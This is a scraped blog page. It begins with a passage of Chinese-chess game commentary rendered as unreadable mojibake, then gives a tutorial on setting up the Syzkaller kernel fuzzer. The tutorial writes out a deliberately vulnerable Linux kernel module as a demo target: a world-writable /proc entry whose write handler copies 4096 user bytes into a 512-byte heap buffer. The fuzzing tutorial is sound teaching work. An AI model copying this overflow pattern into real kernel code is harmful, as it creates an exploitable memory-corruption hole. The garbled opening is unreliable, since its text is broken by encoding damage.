<p>å…·ä½“è¯´å°±æ˜¯å®³æ€•çº¢ç‚®å…­å¹³å››è¹©é©¬è…¿ï¼Œä¸‹ä¸€æ­¥ç‚®äº”è¿›å››åšé‡ç‚®ã€‚ç„¶è€Œè¿™é‡Œé»‘æ–¹å¯ä»¥ç›´æ¥å£«4è¿›5ï¼Œç‚®äº”è¿›å››ï¼Œå£«5è¿›6å¾—å­ï¼Œé»‘å¼ƒç©ºå¤´å¾—ä¸€ç‚®ï¼Œçº¢æ–¹å·¦è½¦æœªå‡ºï¼Œæœ‰ç©ºå¤´ä¹Ÿæ— å¯å¥ˆä½•ï¼Œå¼ƒå­ä¸æˆç«‹ã€‚</p>
<p>å› æ­¤é»‘è½¦1å¹³4åçº¢å”¯ä¸€æ­£æ‰‹æ˜¯ç‚®å…­é€€äº”ï¼Œé»‘é©¬2è¿›3ï¼Œè·³èµ·å±é£é©¬ï¼Œå¹¶ä¸”7è·¯éšæ—¶åå‡»ï¼Œçº¢ä¸­è·¯æ”»åŠ¿å—é˜»ï¼Œçº¢å…­è·¯ç‚®è¿›è€Œåˆé€€ï¼Œæ— åŠŸè€Œè¿”ã€‚é»‘æ–¹åå…ˆã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408020707632.png" alt="image-20250408020707632"></p>
</blockquote>
<ol start="11">
<li><p>ç‚®å…­é€€ä¸‰ è½¦ï¼‘å¹³ï¼”</p>
</li>
<li><p>ç‚®å…­å¹³ä¸‰ ç‚®ï¼—è¿›ï¼”</p>
</li>
<li><p>å…µä¸‰è¿›ä¸€ è½¦ï¼”è¿›ï¼“</p>
</li>
</ol>
<blockquote>
<p>æ­¤å¤„é»‘è½¦åº”è¯¥å·¡æ²³è¿˜æ˜¯éª‘æ²³ï¼Œæˆ‘å¯»æ€äº†åŠå¤©ç»ˆäºä¸€å£æ°”èµ°é”™äº†</p>
<p>æˆ‘å¯»æ€å·¡æ²³é˜²æ­¢çº¢ä¸‰å…µè¿‡æ²³å‹é©¬ï¼Œä½†æ˜¯å¤ªè¿‡è¢«åŠ¨</p>
<p>ä½†æ˜¯éª‘æ²³ä¹Ÿèƒ½åšåˆ°ï¼Œç­‰çº¢ä¸‰å…µè¿‡æ²³åç«‹åˆ»è·Ÿåœ¨åé¢åŒæ—¶æŠ“é©¬ï¼Œæ•ˆæœè¦æ¯”å·¡æ²³ä¸»åŠ¨ã€‚åŒæ—¶å¯ä»¥é¿å…çº¢å†å†²ä¸ƒå…µã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408021507000.png" alt="image-20250408021507000"></p>
<p>å·¡æ²³å¤ªè¿‡è½¯å¼±ï¼Œä½¿å¾—çº¢å…µå¾—ä»¥ä¸ƒè¿›ä¸€ç„¶åä¸Šé©¬ï¼Œçº¢ä¹Ÿå¯ä»¥é©¬ä¸‰è¿›å››è¹¬å·¡æ²³è½¦ã€‚</p>
</blockquote>
<ol start="14">
<li><p>å…µä¸ƒè¿›ä¸€ è±¡ï¼“è¿›ï¼•</p>
</li>
<li><p>é©¬ä¹è¿›ä¸ƒ è½¦ï¼’é€€ï¼’</p>
</li>
</ol>
<blockquote>
<p>è¿™é‡Œçº¢æ–¹ä»“ä¿ƒé©¬ä¹è¿›ä¸ƒï¼Œå®é™…ä¸Šåé¢ä¼šè¢«é»‘è½¦è¿½äº¡é€åŒ—ã€‚</p>
<p>è¿™é‡Œçº¢æ–¹æ­£æ‰‹æ˜¯é©¬ä¸‰è¿›å››ï¼Œæ­£å¥½è¹¬ä¸€è„šé»‘å·¡æ²³è½¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022000471.png" alt="image-20250408022000471"></p>
</blockquote>
<ol start="16">
<li>é©¬ä¸ƒè¿›äº” è½¦ï¼”å¹³ï¼–</li>
</ol>
<blockquote>
<p>é»‘è½¦4å¹³6æ˜¯æ•´ç›˜æ£‹æœ€è‡­çš„ä¸€æ­¥</p>
<p>å½“æ—¶æˆ‘çš„æƒ³æ³•æ˜¯è¦æ±‚å…‘è½¦ï¼Œçº¢è½¦å…ˆæ€é»‘è½¦ï¼Œç„¶åé»‘é©¬é¡ºåŠ¿å‰è¿›ï¼Œä½†æ˜¯çº¢è½¦æœ‰æ ¹ä»–ä¸æ…Œï¼Œçº¢å…ˆå…µä¸‰è¿›ä¸€è¿‡æ²³ï¼Œè¿™å…µç¥–å®—ä¸€ä¸‹å°±ä»¤æˆ‘æ±—æµæµƒèƒŒäº†ã€‚åŸæ¥å¹³è½¦é‚€å…‘å…¨éƒ½æ˜¯æˆ‘çš„ä¸€å¢æƒ…æ„¿ï¼Œå°ä¸‘ç«Ÿæ˜¯æˆ‘è‡ªå·±ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022547827.png" alt="image-20250408022547827"></p>
<p>é‚£ä¹ˆè¿™é‡Œé»‘æ£‹åº”è¯¥æ€ä¹ˆèµ°ï¼Ÿ</p>
<p>æœ‰é©¬2è¿›4å’Œå’5è¿›1ä¸¤ç§</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408023811608.png" alt="image-20250408023811608"></p>
<p>å’5è¿›1ï¼Œçº¢é©¬å¯ä»¥å¤§èƒ†é©¬äº”è¿›ä¸‰ï¼Œå¦‚ç™½é©¹è¿‡éš™ï¼Œæ¥ä¸‹æ¥åé©¬ã€ä¸­ç‚®ã€ä¸‰å…µéƒ½å¯ä»¥å‚æˆ˜ï¼Œæ”»åŠ¿æ±¹æ¶Œã€‚é»‘æ–¹éš¾ä»¥é˜²å¾¡ã€‚è¿™æ­¥è¿›å’åªçˆ½äº†ä¸€æ—¶é¡¶é¡¶é©¬ï¼Œä½†æ˜¯ä¸­å’è„±æ ¹ç»™äº†çº¢æ–¹ä¸­ç‚®å½“å¤´çš„æœºä¼šã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408024123427.png" alt="image-20250408024123427"></p>
<p>é©¬2è¿›4ï¼Œé˜²å®ˆä½3å’å’Œä¸­å’ï¼Œæ­¤æ—¶çº¢è¦æ˜¯å†é©¬äº”è¿›ä¸‰å°±ä¸åˆé€‚äº†ï¼Œæ¨æ¼”å¦‚ä¸‹ï¼š</p>
<ol start="16">
<li>é©¬ä¸ƒè¿›äº” é©¬2è¿›4</li>
<li>é©¬äº”è¿›ä¸‰ è½¦4é€€1</li>
<li>ç›¸ä¸‰è¿›ä¸€ è½¦4å¹³3</li>
</ol>
<p>æ¥ä¸‹æ¥çº¢å‰é©¬æ²¡æœ‰å¥½å»å¤„ï¼Œè¦ä¹ˆå°±æ¢æ‰ä¸­å’ï¼Œè¶‹å‘å’Œæ£‹</p>
</blockquote>
<p>ä»é»‘æ–¹è¿™æ­¥è‡­æ£‹ä¹‹åï¼Œä¸¤ä½å¨å¸ˆé•¿ä¹Ÿæ˜¯ç¤¼å°šå¾€æ¥ï¼Œåªæœ‰æ›´è‡­</p>
<ol start="17">
<li><p>å…µä¸‰è¿›ä¸€ è½¦ï¼–é€€ï¼‘</p>
</li>
<li><p>é©¬äº”è¿›å›› è½¦ï¼’é€€ï¼’</p>
</li>
</ol>
<blockquote>
<p>è¿™ä¸ªè½¦2é€€2æ›´è‡­ï¼Œå¯ä»¥è¯´é»‘æ–¹åŒæ‰‹ç¦»å¼€æ–¹å‘ç›˜äº†</p>
<p>æˆ‘å½“æ—¶æƒ³çš„æ˜¯æˆ‘2è·¯ä»ç„¶å°é”ç€çº¢è½¦ï¼Œå®ƒä¸€æ—¶åŠä¼šå„¿å‡ºä¸æ¥ï¼Œç¡®å®ç›´è½¦æ˜¯ä¸€æ—¶åŠä¼šå„¿å‡ºä¸æ¥ï¼Œä½†æ˜¯æ¨ªè½¦ä¸¤æ­¥å°±åˆ°æˆ‘å®¶é—¨å£ï¼</p>
<p>æˆ‘å¯»æ€çº¢åº”è¯¥æ€¥äºæ±‚æˆå…ˆèµ°å§æ§½å°†å†›çˆ½ä¸€ä¸‹ï¼Œè¿™æ ·æˆ‘å‡ºä¸ªå°†å°±ä¸€ç‚¹äº‹éƒ½æ²¡æœ‰ã€‚ç„¶è€Œçº¢å‡ºä¸ªæ¨ªè½¦é»‘æ–¹ç«‹åˆ»å°±æ— äº†ã€‚</p>
<p>ç„¶è€Œå¯¹é¢æ°´å¹³ä¹Ÿå’Œæˆ‘ä¸€æ ·è‡­ï¼Œä»–çœŸå°±å…ˆå§æ§½çˆ½çˆ½ï¼Œç„¶åçœ‹æˆ‘å°†5å¹³4ï¼Œäºæ˜¯ç‚®äº”å¹³å…­ç»™æˆ‘æ‰“æ‹›å‘¼ï¼Œ</p>
<p>æˆ‘è¯´å“¥ä»¬ç¼ºä¸ªç‚®æ¶ä¸ï¼Œä»–è¯´ä½ çœ‹æˆ‘ä¸‰é©¬ä¸Šæ¥å°†ä¸å°†ä½ å°±å®Œäº†ã€‚ä¸‰é©¬ä¸Šæ¥è¿˜å¾—ä¸¤æ­¥ï¼Œä¸»æ‰“ä¸€ä¸ªæ¾å¼›æ„Ÿã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025153253.png" alt="image-20250408025153253"></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/12/21/syzkaller%20I/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/21/syzkaller%20I/" class="post-title-link" itemprop="url">Syzkaller I - Get start</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-12-21 21:09:00 / Modified: 21:30:19" itemprop="dateCreated datePublished" datetime="2024-12-21T21:09:00+08:00">2024-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Syzkaller-I-Get-start"><a href="#Syzkaller-I-Get-start" class="headerlink" title="[Syzkaller I]Get start"></a>[Syzkaller I]Get start</h1><blockquote>
<p>Syzkaller is the start-of-the-art kernel fuzzer.</p>
<p>Syzkaller takes in a collection of syscall descriptions provided by human experts as template , which provide the fuzzer awareness of the type and arguments of syscalls to be called and dependencies between syscalls . Then the fuzzer randomly generates test cases based on the template , start a kernel to run the test cases , meanwhile monitor the kernel state and collect crash reports.</p>
</blockquote>
<h2 id="0x0-TL-DR"><a href="#0x0-TL-DR" class="headerlink" title="0x0 TL;DR"></a>0x0 TL;DR</h2><p>This post will take a look at the Syzkaller environment setup , and I will provide an ez demo to report a heap overflow in a kernel module. Hopefully my time consuming debugging process can help you . Letâ€™s go.</p>
<h2 id="0x1-setup"><a href="#0x1-setup" class="headerlink" title="0x1 setup"></a>0x1 setup</h2><h3 id="0-enable-cpu-feature-kvm"><a href="#0-enable-cpu-feature-kvm" class="headerlink" title="0.enable cpu feature kvm"></a>0.enable cpu feature kvm</h3><p>inspect the cpuinfo to make sure cpu support the kvm feature</p>
<ul>
<li>for intel:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;vmx&quot;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>for AMD:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;svm&quot;</span> </span><br></pre></td></tr></table></figure>



<h3 id="1-setup-golang-environment"><a href="#1-setup-golang-environment" class="headerlink" title="1.setup golang environment"></a>1.setup golang environment</h3><blockquote>
<p>Golang version is 1.23.4 up to that time.</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz</span><br><span class="line">tar -xzf go1.23.4.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>add Gopath to environment</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOROOT=/path/to/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>run <code>go version</code> to check Golang environment</p>
<h3 id="2-build-Syzkaller"><a href="#2-build-Syzkaller" class="headerlink" title="2.build Syzkaller"></a>2.build Syzkaller</h3><blockquote>
<p>ensure your golang environment</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/syzkaller/</span><br><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="3-compile-Linux-kernel"><a href="#3-compile-Linux-kernel" class="headerlink" title="3.compile Linux kernel"></a>3.compile Linux kernel</h3><p>take Linux 5.14 for example</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.14.tar.xz</span><br><span class="line">tar -xf linux-5.14.tar.xz</span><br><span class="line"><span class="built_in">cd</span> linux-5.14</span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure>

<p>then append the following CONFIGS to .config</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_KCOV_INSTRUMENT_ALL=y</span><br><span class="line">CONFIG_KCOV_ENABLE_COMPARISONS=y</span><br><span class="line">CONFIG_DEBUG_FS=y</span><br><span class="line">CONFIG_DEBUG_KMEMLEAK=y</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y</span><br><span class="line">CONFIG_KALLSYMS=y</span><br><span class="line">CONFIG_KALLSYMS_ALL=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line">CONFIG_NAMESPACES=y</span><br><span class="line">CONFIG_UTS_NS=y</span><br><span class="line">CONFIG_IPC_NS=y</span><br><span class="line">CONFIG_PID_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_CGROUP_PIDS=y</span><br><span class="line">CONFIG_MEMCG=y</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br></pre></td></tr></table></figure>

<blockquote>
<p>more configs : </p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md">https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md</a></p>
</blockquote>
<p>the compile the kernel</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br></pre></td></tr></table></figure>

<p>this will take for a while when you get a bootable kernel image .</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ./arch/x86/boot/bzImage </span><br></pre></td></tr></table></figure>

<h3 id="4-build-virtual-hard-disk"><a href="#4-build-virtual-hard-disk" class="headerlink" title="4.build virtual hard disk"></a>4.build virtual hard disk</h3><p>to build a disk image with MBR and basic file system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">mkdir image</span><br><span class="line">cp ./tools/create-image.sh ./image</span><br><span class="line">cd image</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>

<p>this will take for a while when you get bullseye.img as the disk image and two ssh key file</p>
<blockquote>
<p>bullseye is the release name of Debian up to that time.</p>
</blockquote>
<h3 id="5-build-QEMU"><a href="#5-build-QEMU" class="headerlink" title="5.build QEMU"></a>5.build QEMU</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu-system</span><br></pre></td></tr></table></figure>

<h3 id="6-run-the-kernel"><a href="#6-run-the-kernel" class="headerlink" title="6.run the kernel"></a>6.run the kernel</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel /path/to/linux-5.14/arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">    -drive file=/path/to/syzkaller/image/bullseye.img,format=raw \</span><br><span class="line">    -net user,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">    -net nic,model=e1000 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid 2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Login as root without password</p>
<blockquote>
<p>errors :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure>

<p>check this post :</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary">https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary</a></p>
</blockquote>
<p>then make sure ssh is avaliable</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ./image/bullseye.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br></pre></td></tr></table></figure>

<h3 id="7-start-SyzKaller"><a href="#7-start-SyzKaller" class="headerlink" title="7.start SyzKaller"></a>7.start SyzKaller</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/syzkaller</span><br><span class="line"><span class="built_in">mkdir</span> workdir</span><br></pre></td></tr></table></figure>

<p>and edit a config file saved as default.cfg</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>run Syzkaller by:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=./default.cfg -debug</span><br></pre></td></tr></table></figure>

<p>meanwhile explorer 127.0.0.1:56741 to get a view of the current fuzzing state</p>
<h2 id="0x2-demo"><a href="#0x2-demo" class="headerlink" title="0x2 demo"></a>0x2 demo</h2><p>take a kernel heap overflow for example.</p>
<h3 id="1-build-a-vulnability-kernel-module"><a href="#1-build-a-vulnability-kernel-module" class="headerlink" title="1.build a vulnability kernel module"></a>1.build a vulnability kernel module</h3><p>this module contains a heap overflow in function proc_write, and we will compile it directly into the kernel</p>
<p>up to 4096 bytes can be written to a narrow 512 Byte slab object in cache kmalloc-512</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">proc_open</span> <span class="params">(<span class="keyword">struct</span> inode *proc_inode, <span class="keyword">struct</span> file *proc_file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into open!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_read</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into read&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_write</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">const</span> <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *c = kmalloc(<span class="number">512</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(c, proc_user, <span class="number">4096</span>);</span><br><span class="line">    printk(<span class="string">&quot;:into write!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">test_op</span> =</span> &#123;</span><br><span class="line">    .proc_open = proc_open,</span><br><span class="line">    .proc_read = proc_read,</span><br><span class="line">    .proc_write = proc_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mod_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;test1&quot;</span>, S_IRUGO|S_IWUGO, <span class="literal">NULL</span>, &amp;test_op);</span><br><span class="line">    printk(<span class="string">&quot;:proc init over!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mod_init);</span><br></pre></td></tr></table></figure>

<p>save as <code>linux-5.14/drivers/char/testxy.c</code></p>
<p>then append following to </p>
<p><code>linux-5.14/drivers/char/Kconfig</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">config</span> <span class="string">TESTXY_MODULE</span></span><br><span class="line">  <span class="string">tristate</span> <span class="string">&quot;dustball&#x27;s vulnability module&quot;</span></span><br><span class="line">  <span class="string">default</span> <span class="string">y</span></span><br><span class="line">  <span class="string">help</span></span><br><span class="line">    <span class="string">This</span> <span class="string">file</span> <span class="string">is</span> <span class="string">to</span> <span class="string">test</span> <span class="string">a</span> <span class="string">buffer</span> <span class="string">overflow</span></span><br></pre></td></tr></table></figure>



<p>then append following to </p>
<p><code>linux-5.14/drivers/char/Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-<span class="variable">$(CONFIG_TESTXY_MODULE)</span> += testxy.o</span><br></pre></td></tr></table></figure>



<p>reconfig the kernel with </p>
<p><code>make menuconfig</code></p>
<p>we can find the module @Device Drivers&#x2F;dustballâ€™s vulnability module</p>
<blockquote>
<p><code>*</code> means compile into the kernel, chosen</p>
<p><code>M</code> means compile as independent module</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221203510528.png" alt="image-20241221203510528"></p>
<p>recompile the kernel</p>
